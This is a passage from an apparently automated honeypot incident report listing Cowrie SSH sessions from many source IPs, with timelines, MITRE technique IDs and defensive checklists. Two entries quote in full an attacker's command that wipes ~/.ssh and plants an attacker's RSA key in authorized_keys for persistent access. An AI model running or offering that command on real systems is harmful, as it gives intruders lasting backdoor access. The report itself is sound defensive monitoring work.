| `2026-07-28 07:22:20` | `cowrie.login.success` |
| `2026-07-28 07:22:21` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:22:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.181.81[.]150` to AbuseIPDB if not already reported
- [ ] Block `103.181.81[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0820981d7bda

| Field | Detail |
|---|---|
| **Source IP** | `156.240.235[.]171` |
| **First Seen** | 2026-07-28 07:22 |
| **Last Seen** | 2026-07-28 07:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:22:59` | `cowrie.session.connect` |
| `2026-07-28 07:22:59` | `cowrie.client.version` |
| `2026-07-28 07:22:59` | `cowrie.client.kex` |
| `2026-07-28 07:23:00` | `cowrie.login.success` |
| `2026-07-28 07:23:01` | `cowrie.session.params` |
| `2026-07-28 07:23:01` | `cowrie.command.input` |
| `2026-07-28 07:23:01` | `cowrie.command.failed` |
| `2026-07-28 07:23:02` | `cowrie.log.closed` |
| `2026-07-28 07:23:03` | `cowrie.session.params` |
| `2026-07-28 07:23:03` | `cowrie.command.input` |
| `2026-07-28 07:23:03` | `cowrie.session.file_download` |
| `2026-07-28 07:23:03` | `cowrie.log.closed` |
| `2026-07-28 07:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.240.235[.]171` to AbuseIPDB if not already reported
- [ ] Block `156.240.235[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3028bb3cb13

| Field | Detail |
|---|---|
| **Source IP** | `156.240.235[.]171` |
| **First Seen** | 2026-07-28 07:23 |
| **Last Seen** | 2026-07-28 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:23:03` | `cowrie.session.connect` |
| `2026-07-28 07:23:03` | `cowrie.client.version` |
| `2026-07-28 07:23:03` | `cowrie.client.kex` |
| `2026-07-28 07:23:04` | `cowrie.login.success` |
| `2026-07-28 07:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.240.235[.]171` to AbuseIPDB if not already reported
- [ ] Block `156.240.235[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f8c68de8d0b

| Field | Detail |
|---|---|
| **Source IP** | `156.240.235[.]171` |
| **First Seen** | 2026-07-28 07:23 |
| **Last Seen** | 2026-07-28 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:23:05` | `cowrie.session.connect` |
| `2026-07-28 07:23:05` | `cowrie.client.version` |
| `2026-07-28 07:23:05` | `cowrie.client.kex` |
| `2026-07-28 07:23:06` | `cowrie.login.success` |
| `2026-07-28 07:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.240.235[.]171` to AbuseIPDB if not already reported
- [ ] Block `156.240.235[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dd0c717d4b7

| Field | Detail |
|---|---|
| **Source IP** | `60.18.139[.]82` |
| **First Seen** | 2026-07-28 07:24 |
| **Last Seen** | 2026-07-28 07:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:24:52` | `cowrie.session.connect` |
| `2026-07-28 07:24:53` | `cowrie.client.version` |
| `2026-07-28 07:24:53` | `cowrie.client.kex` |
| `2026-07-28 07:24:55` | `cowrie.login.success` |
| `2026-07-28 07:24:56` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.18.139[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.18.139[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71ba5ba0b441

| Field | Detail |
|---|---|
| **Source IP** | `117.2.123[.]19` |
| **First Seen** | 2026-07-28 07:25 |
| **Last Seen** | 2026-07-28 07:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:25:01` | `cowrie.session.connect` |
| `2026-07-28 07:25:01` | `cowrie.client.version` |
| `2026-07-28 07:25:01` | `cowrie.client.kex` |
| `2026-07-28 07:25:03` | `cowrie.login.success` |
| `2026-07-28 07:25:04` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.2.123[.]19` to AbuseIPDB if not already reported
- [ ] Block `117.2.123[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-125d68556a68

| Field | Detail |
|---|---|
| **Source IP** | `194.31.8[.]12` |
| **First Seen** | 2026-07-28 07:25 |
| **Last Seen** | 2026-07-28 07:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:25:47` | `cowrie.session.connect` |
| `2026-07-28 07:25:48` | `cowrie.client.version` |
| `2026-07-28 07:25:48` | `cowrie.client.kex` |
| `2026-07-28 07:25:49` | `cowrie.login.success` |
| `2026-07-28 07:25:49` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.31.8[.]12` to AbuseIPDB if not already reported
- [ ] Block `194.31.8[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f34c225b5b01

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-07-28 07:25 |
| **Last Seen** | 2026-07-28 07:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:25:54` | `cowrie.session.connect` |
| `2026-07-28 07:25:55` | `cowrie.client.version` |
| `2026-07-28 07:25:55` | `cowrie.client.kex` |
| `2026-07-28 07:25:56` | `cowrie.login.success` |
| `2026-07-28 07:25:56` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75a5f1a793f7

| Field | Detail |
|---|---|
| **Source IP** | `112.197.2[.]116` |
| **First Seen** | 2026-07-28 07:25 |
| **Last Seen** | 2026-07-28 07:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:25:55` | `cowrie.session.connect` |
| `2026-07-28 07:25:55` | `cowrie.client.version` |
| `2026-07-28 07:25:55` | `cowrie.client.kex` |
| `2026-07-28 07:25:56` | `cowrie.login.success` |
| `2026-07-28 07:25:57` | `cowrie.session.params` |
| `2026-07-28 07:25:57` | `cowrie.command.input` |
| `2026-07-28 07:25:57` | `cowrie.log.closed` |
| `2026-07-28 07:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.197.2[.]116` to AbuseIPDB if not already reported
- [ ] Block `112.197.2[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a0e262b8cd6

| Field | Detail |
|---|---|
| **Source IP** | `103.98.176[.]164` |
| **First Seen** | 2026-07-28 07:26 |
| **Last Seen** | 2026-07-28 07:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:26:28` | `cowrie.session.connect` |
| `2026-07-28 07:26:28` | `cowrie.client.version` |
| `2026-07-28 07:26:28` | `cowrie.client.kex` |
| `2026-07-28 07:26:29` | `cowrie.login.success` |
| `2026-07-28 07:26:30` | `cowrie.session.params` |
| `2026-07-28 07:26:30` | `cowrie.command.input` |
| `2026-07-28 07:26:30` | `cowrie.command.failed` |
| `2026-07-28 07:26:31` | `cowrie.log.closed` |
| `2026-07-28 07:26:32` | `cowrie.session.params` |
| `2026-07-28 07:26:32` | `cowrie.command.input` |
| `2026-07-28 07:26:32` | `cowrie.session.file_download` |
| `2026-07-28 07:26:32` | `cowrie.log.closed` |
| `2026-07-28 07:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.98.176[.]164` to AbuseIPDB if not already reported
- [ ] Block `103.98.176[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9975e542e32

| Field | Detail |
|---|---|
| **Source IP** | `103.98.176[.]164` |
| **First Seen** | 2026-07-28 07:26 |
| **Last Seen** | 2026-07-28 07:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:26:32` | `cowrie.session.connect` |
| `2026-07-28 07:26:32` | `cowrie.client.version` |
| `2026-07-28 07:26:32` | `cowrie.client.kex` |
| `2026-07-28 07:26:33` | `cowrie.login.success` |
| `2026-07-28 07:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.98.176[.]164` to AbuseIPDB if not already reported
- [ ] Block `103.98.176[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-693352618d1a

| Field | Detail |
|---|---|
| **Source IP** | `103.98.176[.]164` |
| **First Seen** | 2026-07-28 07:26 |
| **Last Seen** | 2026-07-28 07:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:26:34` | `cowrie.session.connect` |
| `2026-07-28 07:26:34` | `cowrie.client.version` |
| `2026-07-28 07:26:34` | `cowrie.client.kex` |
| `2026-07-28 07:26:35` | `cowrie.login.success` |
| `2026-07-28 07:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.98.176[.]164` to AbuseIPDB if not already reported
- [ ] Block `103.98.176[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f10c78d056

| Field | Detail |
|---|---|
| **Source IP** | `59.34.17[.]130` |
| **First Seen** | 2026-07-28 07:28 |
| **Last Seen** | 2026-07-28 07:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:28:04` | `cowrie.session.connect` |
| `2026-07-28 07:28:05` | `cowrie.client.version` |
| `2026-07-28 07:28:05` | `cowrie.client.kex` |
| `2026-07-28 07:28:08` | `cowrie.login.success` |
| `2026-07-28 07:28:08` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:28:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.34.17[.]130` to AbuseIPDB if not already reported
- [ ] Block `59.34.17[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8556ac875643

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 07:28 |
| **Last Seen** | 2026-07-28 07:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:28:08` | `cowrie.session.connect` |
| `2026-07-28 07:28:09` | `cowrie.client.version` |
| `2026-07-28 07:28:09` | `cowrie.client.kex` |
| `2026-07-28 07:28:09` | `cowrie.login.success` |
| `2026-07-28 07:28:09` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:28:09` | `cowrie.direct-tcpip.data` |
| `2026-07-28 07:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4c0f685de0

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]250` |
| **First Seen** | 2026-07-28 07:28 |
| **Last Seen** | 2026-07-28 07:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:28:14` | `cowrie.session.connect` |
| `2026-07-28 07:28:15` | `cowrie.client.version` |
| `2026-07-28 07:28:15` | `cowrie.client.kex` |
| `2026-07-28 07:28:18` | `cowrie.login.success` |
| `2026-07-28 07:28:19` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4ac92e6035d

| Field | Detail |
|---|---|
| **Source IP** | `222.86.168[.]224` |
| **First Seen** | 2026-07-28 07:33 |
| **Last Seen** | 2026-07-28 07:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:33:45` | `cowrie.session.connect` |
| `2026-07-28 07:33:45` | `cowrie.client.version` |
| `2026-07-28 07:33:45` | `cowrie.client.kex` |
| `2026-07-28 07:33:49` | `cowrie.login.success` |
| `2026-07-28 07:33:50` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.86.168[.]224` to AbuseIPDB if not already reported
- [ ] Block `222.86.168[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df76789f4eb0

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-28 07:37 |
| **Last Seen** | 2026-07-28 07:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:37:05` | `cowrie.session.connect` |
| `2026-07-28 07:37:05` | `cowrie.client.version` |
| `2026-07-28 07:37:05` | `cowrie.client.kex` |
| `2026-07-28 07:37:07` | `cowrie.login.success` |
| `2026-07-28 07:37:07` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7b498577bfd

| Field | Detail |
|---|---|
| **Source IP** | `65.20.191[.]231` |
| **First Seen** | 2026-07-28 07:37 |
| **Last Seen** | 2026-07-28 07:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:37:17` | `cowrie.session.connect` |
| `2026-07-28 07:37:18` | `cowrie.client.version` |
| `2026-07-28 07:37:18` | `cowrie.client.kex` |
| `2026-07-28 07:37:20` | `cowrie.login.success` |
| `2026-07-28 07:37:21` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.191[.]231` to AbuseIPDB if not already reported
- [ ] Block `65.20.191[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f51356bb2ba

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 07:44 |
| **Last Seen** | 2026-07-28 07:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:44:40` | `cowrie.session.connect` |
| `2026-07-28 07:44:40` | `cowrie.client.version` |
| `2026-07-28 07:44:40` | `cowrie.client.kex` |
| `2026-07-28 07:44:40` | `cowrie.login.success` |
| `2026-07-28 07:44:40` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:44:40` | `cowrie.direct-tcpip.data` |
| `2026-07-28 07:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f85a608ddc99

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-07-28 07:46 |
| **Last Seen** | 2026-07-28 07:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:46:47` | `cowrie.session.connect` |
| `2026-07-28 07:46:48` | `cowrie.client.version` |
| `2026-07-28 07:46:48` | `cowrie.client.kex` |
| `2026-07-28 07:46:50` | `cowrie.login.success` |
| `2026-07-28 07:46:51` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-067f10eb5aa0

| Field | Detail |
|---|---|
| **Source IP** | `202.138.229[.]190` |
| **First Seen** | 2026-07-28 07:46 |
| **Last Seen** | 2026-07-28 07:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:46:56` | `cowrie.session.connect` |
| `2026-07-28 07:46:57` | `cowrie.client.version` |
| `2026-07-28 07:46:57` | `cowrie.client.kex` |
| `2026-07-28 07:46:59` | `cowrie.login.success` |
| `2026-07-28 07:47:00` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.138.229[.]190` to AbuseIPDB if not already reported
- [ ] Block `202.138.229[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8ad62170469

| Field | Detail |
|---|---|
| **Source IP** | `106.89.60[.]3` |
| **First Seen** | 2026-07-28 07:49 |
| **Last Seen** | 2026-07-28 07:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:49:17` | `cowrie.session.connect` |
| `2026-07-28 07:49:18` | `cowrie.client.version` |
| `2026-07-28 07:49:18` | `cowrie.client.kex` |
| `2026-07-28 07:49:21` | `cowrie.login.success` |
| `2026-07-28 07:49:21` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.60[.]3` to AbuseIPDB if not already reported
- [ ] Block `106.89.60[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a68ec645c628

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]73` |
| **First Seen** | 2026-07-28 07:52 |
| **Last Seen** | 2026-07-28 07:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:52:42` | `cowrie.session.connect` |
| `2026-07-28 07:52:43` | `cowrie.client.version` |
| `2026-07-28 07:52:43` | `cowrie.client.kex` |
| `2026-07-28 07:52:45` | `cowrie.login.success` |
| `2026-07-28 07:52:46` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]73` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5893ee8ba8a

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-07-28 07:58 |
| **Last Seen** | 2026-07-28 07:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:58:13` | `cowrie.session.connect` |
| `2026-07-28 07:58:13` | `cowrie.client.version` |
| `2026-07-28 07:58:13` | `cowrie.client.kex` |
| `2026-07-28 07:58:15` | `cowrie.login.success` |
| `2026-07-28 07:58:15` | `cowrie.direct-tcpip.request` |
| `2026-07-28 07:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d5e83386e43

| Field | Detail |
|---|---|
| **Source IP** | `103.229.125[.]106` |
| **First Seen** | 2026-07-28 07:59 |
| **Last Seen** | 2026-07-28 07:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
